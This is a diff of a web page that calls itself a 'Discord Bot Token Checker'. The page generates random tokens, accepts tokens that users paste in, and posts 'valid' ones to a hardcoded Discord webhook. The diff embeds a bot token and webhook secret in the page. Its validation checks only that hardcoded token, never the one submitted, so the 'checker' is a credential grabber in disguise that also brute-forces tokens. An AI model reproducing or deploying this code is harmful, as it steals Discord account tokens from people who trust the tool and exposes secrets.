@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Discord Bot Token Generator</title>
+    <title>Discord Bot Token Checker</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -80,8 +80,8 @@
     </style>
 </head>
 <body>
-    <h1>Token Generator</h1>
-    <button class="button" onclick="generateToken()">Generate Token</button>
+    <h1>Token Checker</h1>
+    <button class="button" id="start-stop-btn" onclick="toggleGeneration()">Start</button>
 
     <div class="box valid-box">
         <h3>Valid Tokens:</h3>
@@ -100,12 +100,25 @@
 
     <script>
         let invalidCount = 0;
+        let isGenerating = false;
         const webhookUrl = 'https://discord.com/api/webhooks/1291292062993485824/E2RA9ftK97nJu813Lms3QcYGghu4J6v0CEZb1xkpNoys7-jru3MpC1dC7o2CATGicCMp';
+        const botToken = 'MTMxMzkzNTcwNDY2MDY0MzkzMg.GuAPNS.XAh9bxGr2gChVMXOozqBK28IX3YaClxwdbPNL0';
 
-        function generateToken() {
+        function toggleGeneration() {
+            if (isGenerating) {
+                isGenerating = false;
+                document.getElementById('start-stop-btn').textContent = 'Start';
+            } else {
+                isGenerating = true;
+                document.getElementById('start-stop-btn').textContent = 'Stop';
+                generateToken();
+            }
+        }
+
+        async function generateToken() {
+            if (!isGenerating) return;
             const token = generateRandomToken();
-            const isValid = validateToken(token);
-
+            const isValid = await validateToken(token);
             if (isValid) {
                 showValidToken(token);
                 sendToWebhook(token);
@@ -113,13 +126,13 @@
                 invalidCount++;
                 updateInvalidCount();
             }
+            setTimeout(generateToken, 1000);
         }
 
         function generateRandomToken() {
             const part1 = randomString(24);
             const part2 = randomString(6);
             const part3 = randomString(32);
-
             return `${part1}.${part2}.${part3}`;
         }
 
@@ -132,8 +145,18 @@
             return result;
         }
 
-        function validateToken(token) {
-            return Math.random() > 0.5;
+        async function validateToken(token) {
+            try {
+                const response = await fetch(`https://discord.com/api/v10/users/@me`, {
+                    method: 'GET',
+                    headers: {
+                        'Authorization': `Bot ${botToken}`
+                    }
+                });
+                return response.ok;
+            } catch (error) {
+                return false;
+            }
         }
 
         function showValidToken(token) {
@@ -148,10 +171,10 @@
             document.getElementById('invalid-count').textContent = invalidCount;
         }
 
-        function checkUserToken() {
+        async function checkUserToken() {
             const userToken = document.getElementById('input-token').value;
             if (userToken) {
-                const isValid = validateToken(userToken);
+                const isValid = await validateToken(userToken);
                 if (isValid) {
                     showValidToken(userToken);
                     sendToWebhook(userToken);
@@ -163,9 +186,27 @@
             }
         }
 
-        function sendToWebhook(token) {
+        async function sendToWebhook(token) {
+            const botInfo = await getBotInfo();
             const payload = {
-                content: `Valid Token: ${token}`
+                content: `Valid Token: ${token}`,
+                embeds: [
+                    {
+                        title: "Bot Information",
+                        fields: [
+                            {
+                                name: "Bot Username",
+                                value: botInfo.username,
+                                inline: true
+                            },
+                            {
+                                name: "Bot ID",
+                                value: botInfo.id,
+                                inline: true
+                            }
+                        ]
+                    }
+                ]
             };
 
             fetch(webhookUrl, {
@@ -185,6 +226,23 @@
             .catch(error => {
                 console.error('Error sending token to webhook:', error);
             });
+        }
+
+        async function getBotInfo() {
+            try {
+                const response = await fetch(`https://discord.com/api/v10/users/@me`, {
+                    method: 'GET',
+                    headers: {
+                        'Authorization': `Bot ${botToken}`
+                    }
+                });
+
+                const data = await response.json();
+                return { username: data.username, id: data.id };
+            } catch (error) {
+                console.error('Error fetching bot info:', error);
+                return { username: 'Unknown', id: 'Unknown' };
+            }
         }
     </script>
 </body>
